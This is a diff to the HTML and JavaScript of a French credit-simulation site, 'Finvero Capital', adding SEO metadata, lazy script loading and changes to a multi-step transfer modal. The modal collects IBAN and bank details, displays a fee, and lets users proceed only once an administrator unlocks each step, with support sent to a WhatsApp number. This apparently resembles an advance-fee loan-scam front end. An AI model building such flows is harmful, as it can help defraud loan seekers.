@@ -2,7 +2,26 @@
 <html lang="fr" translate="yes">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+    <meta name="description" content="Finvero Capital : simulation de crédit et demande de financement en ligne pour les utilisateurs en Europe. Service disponible en plusieurs langues." />
+    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1" />
+    <meta name="theme-color" content="#0f2b4b" />
+    <meta name="referrer" content="strict-origin-when-cross-origin" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Finvero Capital" />
+    <meta property="og:title" content="Finvero Capital – Simulation de crédit" />
+    <meta property="og:description" content="Simulez votre crédit et préparez votre demande de financement en ligne." />
+    <meta property="og:locale" content="fr_FR" />
+    <meta property="og:locale:alternate" content="en_GB" />
+    <meta property="og:locale:alternate" content="de_DE" />
+    <meta property="og:locale:alternate" content="es_ES" />
+    <meta property="og:locale:alternate" content="it_IT" />
+    <meta property="og:locale:alternate" content="pt_PT" />
+    <meta property="og:locale:alternate" content="nl_NL" />
+    <meta name="keywords" content="simulation crédit Europe, prêt en ligne, financement, crédit France, crédit Allemagne, crédit Belgique, crédit Espagne, crédit Italie, crédit Portugal, crédit Pays-Bas, crédit Autriche, crédit Suisse, crédit Luxembourg, crédit Irlande, crédit Pologne, crédit Roumanie, crédit Grèce, crédit Suède, crédit Danemark, crédit Finlande, crédit Norvège" />
+    <link rel="preconnect" href="https://vdwkpzawdlexuqqyhntl.supabase.co" crossorigin />
+    <link rel="dns-prefetch" href="//vdwkpzawdlexuqqyhntl.supabase.co" />
+    <link rel="canonical" href="./" />
     <title>Finvero Capital – Simulation de crédit</title>
     <style>
         /* --- Styles inchangés --- */
@@ -16,6 +35,9 @@
         .hero { display: flex; flex-wrap: wrap; align-items: center; gap: 2rem; padding: 1.5rem 0 1rem; }
         .hero-image { flex: 1 1 280px; }
         .hero-image img { width: 100%; height: auto; border-radius: 20px; display: block; }
+        .hero-image img { content-visibility:auto; }
+        .promo-banner, .trust-section, .steps-after-form, .legal-footer { content-visibility:auto; contain-intrinsic-size: 300px; }
+        @media (prefers-reduced-motion: reduce) { *, *::before, *::after { scroll-behavior:auto !important; animation-duration:0.01ms !important; animation-iteration-count:1 !important; transition-duration:0.01ms !important; } }
         .hero-text { flex: 1 1 280px; }
         .hero-text h1 { font-size: 2.4rem; font-weight: 700; color: #0f2b4b; line-height: 1.15; margin-bottom: 0.5rem; }
         .hero-text h1 span { color: #2a7de1; }
@@ -113,7 +135,11 @@
         .tracking-modal .tracking-card .copy-btn.copied { background: #1f8b4c; }
         .transfer-modal { position: fixed; inset: 0; background: rgba(15,43,75,0.7); display: none; align-items: center; justify-content: center; padding: 1rem; z-index: 3000; backdrop-filter: blur(4px); }
         .transfer-modal.open { display: flex; }
-        .transfer-card { background: #ffffff; border-radius: 24px; padding: 2.5rem 3rem; max-width: 500px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; animation: fadeUp 0.4s ease; max-height: 90vh; overflow-y: auto; }
+        .transfer-card { position:relative; background: #ffffff; border-radius: 24px; padding: 2.5rem 3rem; max-width: 500px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); text-align: center; animation: fadeUp 0.4s ease; max-height: 90vh; overflow-y: auto; }
+        .transfer-card .transfer-back-top { position:absolute; top:12px; left:12px; width:34px; height:34px; padding:0; border:1px solid #dce3ed; border-radius:50%; background:#fff; color:#0f2b4b; font-size:20px; line-height:32px; text-align:center; cursor:pointer; z-index:2; }
+        .transfer-card .transfer-back-top:hover { background:#f1f6fb; }
+        .transfer-card .transfer-next-btn { margin-top:.75rem; }
+        .transfer-card .transfer-support-btn { margin-top:.5rem; }
         .transfer-card h2 { font-size: 1.6rem; color: #0f2b4b; margin-bottom: 0.5rem; }
         .transfer-card .fee-amount { font-size: 2.2rem; font-weight: 700; color: #a12b2b; background: #fff0f0; padding: 0.5rem 1rem; border-radius: 12px; margin: 1rem 0; display: inline-block; }
         .transfer-card .info-text { color: #5b6f87; font-size: 0.95rem; margin-bottom: 1.5rem; line-height: 1.6; }
@@ -304,6 +330,91 @@
         .doc-card .doc-item .doc-link:hover { background:#1a3a62; }
         .doc-card .doc-close { float:right; border:0; background:#eef3f9; border-radius:50%; width:36px; height:36px; cursor:pointer; font-size:1.1rem; color:#0f2b4b; }
     </style>
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FinancialService",
+  "name": "Finvero Capital",
+  "description": "Service de simulation de crédit et de demande de financement en ligne.",
+  "areaServed": [
+    "Europe",
+    "Albanie",
+    "Andorre",
+    "Arménie",
+    "Autriche",
+    "Azerbaïdjan",
+    "Biélorussie",
+    "Belgique",
+    "Bosnie-Herzégovine",
+    "Bulgarie",
+    "Chypre",
+    "Croatie",
+    "République tchèque",
+    "Danemark",
+    "Estonie",
+    "Finlande",
+    "France",
+    "Géorgie",
+    "Allemagne",
+    "Grèce",
+    "Hongrie",
+    "Islande",
+    "Irlande",
+    "Italie",
+    "Kazakhstan",
+    "Kosovo",
+    "Lettonie",
+    "Liechtenstein",
+    "Lituanie",
+    "Luxembourg",
+    "Malte",
+    "Moldavie",
+    "Monaco",
+    "Monténégro",
+    "Pays-Bas",
+    "Macédoine du Nord",
+    "Norvège",
+    "Pologne",
+    "Portugal",
+    "Roumanie",
+    "Russie",
+    "Saint-Marin",
+    "Serbie",
+    "Slovaquie",
+    "Slovénie",
+    "Espagne",
+    "Suède",
+    "Suisse",
+    "Turquie",
+    "Ukraine",
+    "Royaume-Uni",
+    "Vatican"
+  ],
+  "availableLanguage": [
+    "fr",
+    "en",
+    "es",
+    "pt",
+    "de",
+    "it",
+    "nl",
+    "pl",
+    "ro",
+    "cs",
+    "el",
+    "sv",
+    "da",
+    "fi",
+    "no",
+    "hu",
+    "bg",
+    "sk",
+    "uk",
+    "tr"
+  ],
+  "serviceType": "Credit and financing simulation"
+}
+    </script>
 </head>
 <body>
 
@@ -360,7 +471,7 @@
     <!-- HERO -->
     <section class="hero">
         <div class="hero-image">
-            <img src="1.jpg" alt="Financement" loading="lazy" />
+            <img src="1.jpg" alt="Financement" loading="eager" fetchpriority="high" decoding="async" />
         </div>
         <div class="hero-text">
             <h1>Avez-vous besoin <br><span>d'un financement</span> ?</h1>
@@ -809,10 +920,11 @@
         <div class="fee-amount" id="transferFeeDisplay" style="display:none;"></div>
         <p class="info-text" id="transferSubtext" style="font-size:0.9rem; display:none;"></p>
 
+        <button type="button" class="transfer-back-top" id="backTransferBtn" style="display:none;" aria-label="Retour" title="Retour">←</button>
         <button class="transfer-btn" id="confirmTransferBtn">Valider</button>
-        <button class="transfer-btn" id="continueTransferBtn" style="display:none; background:#0f2b4b;">Continuer</button>
-        <button class="transfer-btn" id="backTransferBtn" style="display:none; background:#71839a;">← Retour</button>
-        <button class="transfer-btn" id="supportTransferBtn" style="display:none; background:#0f2b4b;">📞 Contacter le support</button>
+        <button class="transfer-btn transfer-next-btn" id="continueTransferBtn" style="display:none; background:#0f2b4b;">Continuer</button>
+        
+        <button class="transfer-btn transfer-support-btn" id="supportTransferBtn" style="display:none; background:#0f2b4b;">📞 Contacter le support</button>
 
         <button class="close-transfer" id="closeTransferBtn">✕ Annuler</button>
         <div id="transferStatus" class="transfer-success" style="display:none;"></div>
@@ -884,7 +996,20 @@ function googleTranslateElementInit() {
     }, 'google_translate_element');
 }
 </script>
-<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+<script>
+(function () {
+    function loadGoogleTranslate() {
+        if (window.__finveroGoogleTranslateLoading || window.google?.translate) return;
+        window.__finveroGoogleTranslateLoading = true;
+        const script = document.createElement('script');
+        script.src = 'https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
+        script.async = true;
+        script.crossOrigin = 'anonymous';
+        document.head.appendChild(script);
+    }
+    window.__finveroLoadGoogleTranslate = loadGoogleTranslate;
+})();
+</script>
 
 <script>
 document.addEventListener('DOMContentLoaded', function () {
@@ -895,6 +1020,7 @@ document.addEventListener('DOMContentLoaded', function () {
     window.FINVERO_LANGUAGE = current;
     window.FINVERO_LOCALE = current === 'fr' ? 'fr-FR' : current;
     document.documentElement.lang = current;
+    if (current !== 'fr' && window.__finveroLoadGoogleTranslate) window.__finveroLoadGoogleTranslate();
     if (select) {
         select.value = current;
         select.addEventListener('change', function () {
@@ -903,13 +1029,16 @@ document.addEventListener('DOMContentLoaded', function () {
             window.FINVERO_LANGUAGE = target;
             window.FINVERO_LOCALE = target === 'fr' ? 'fr-FR' : target;
             document.documentElement.lang = target;
+            if (target !== 'fr' && window.__finveroLoadGoogleTranslate) window.__finveroLoadGoogleTranslate();
             window.location.reload();
         });
     }
 });
 </script>
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
+(function () {
+    const runFinveroApp = function () {
+
     // ===== BASE DE DONNÉES SUPABASE =====
     const SUPABASE_URL = 'https://vdwkpzawdlexuqqyhntl.supabase.co';
     const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_CtcpCPXK9cwKMm7panaa-w_gHPsUD-L';
@@ -1636,36 +1765,42 @@ document.addEventListener('DOMContentLoaded', function () {
                 window.open('https://wa.me/447520682877', '_blank');
             };
 
-            if (adminUnlocked) {
-                continueBtn.style.display = 'inline-block';
-                continueBtn.textContent = 'Continuer vers l\'étape suivante';
-                continueBtn.onclick = async function() {
-                    const { data: userData } = await localDB.auth.getUser();
-                    if (!userData.user) return;
+            // Le bouton « Suivant » reste visible à l'écran 2.
+            // Il reste grisé tant que l'administrateur n'a pas validé l'étape 2.
+            continueBtn.style.display = 'inline-block';
+            continueBtn.textContent = 'Continuer vers l\'étape suivante';
+            continueBtn.disabled = !adminUnlocked;
+            continueBtn.title = adminUnlocked
+                ? 'Continuer vers l’étape 3'
+                : 'En attente de validation de l’administrateur';
+            continueBtn.onclick = async function() {
+                if (!adminUnlocked) return;
+                const { data: userData } = await localDB.auth.getUser();
+                if (!userData.user) return;
 
-                    continueBtn.disabled = true;
+                continueBtn.disabled = true;
 
-                    try {
-                        await upsertTransferSession(userData.user.id, {
-                            step: 2,
-                            admin_unlocked: false,
-                            fullName: transferData.fullName,
-                            iban: transferData.iban,
-                            bankName: transferData.bankName,
-                            amount: transferData.amount
-                        });
+                try {
+                    // On conserve la validation de l'administrateur pour qu'un retour
+                    // depuis l'écran 3 réactive immédiatement le bouton « Suivant ».
+                    await upsertTransferSession(userData.user.id, {
+                        step: 2,
+                        admin_unlocked: true,
+                        fullName: transferData.fullName,
+                        iban: transferData.iban,
+                        bankName: transferData.bankName,
+                        amount: transferData.amount
+                    });
 
-                        transferStep = 2;
-                        adminUnlocked = false;
-                        await renderTransferStep(2);
-                    } catch (e) {
-                        console.error('Erreur passage étape 3:', e);
-                        alert(e.message || 'Impossible de passer à l’étape suivante.');
-                    } finally {
-                        continueBtn.disabled = false;
-                    }
-                };
-            }
+                    transferStep = 2;
+                    adminUnlocked = true;
+                    await renderTransferStep(2);
+                } catch (e) {
+                    console.error('Erreur passage étape 3:', e);
+                    alert(e.message || 'Impossible de passer à l’étape suivante.');
+                    continueBtn.disabled = !adminUnlocked;
+                }
+            };
 
             return;
         }
@@ -1688,7 +1823,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 if (userData.user) {
                     await upsertTransferSession(userData.user.id, {
                         step: 1,
-                        admin_unlocked: false,
+                        admin_unlocked: adminUnlocked,
                         fullName: transferData.fullName,
                         iban: transferData.iban,
                         bankName: transferData.bankName,
@@ -1696,7 +1831,6 @@ document.addEventListener('DOMContentLoaded', function () {
                     });
                 }
                 transferStep = 1;
-                adminUnlocked = false;
                 await renderTransferStep(1);
             };
 
@@ -2665,6 +2799,22 @@ document.addEventListener('DOMContentLoaded', function () {
         await startSupabaseRealtime(sessionData.session?.user || null);
     })();
 
+
+    };
+    if (window.supabase) {
+        runFinveroApp();
+        return;
+    }
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
+    script.async = true;
+    script.crossOrigin = 'anonymous';
+    script.onload = runFinveroApp;
+    script.onerror = function () {
+        console.error('Impossible de charger le module de connexion.');
+    };
+    document.head.appendChild(script);
+})();
 </script>
 </body>
 </html>
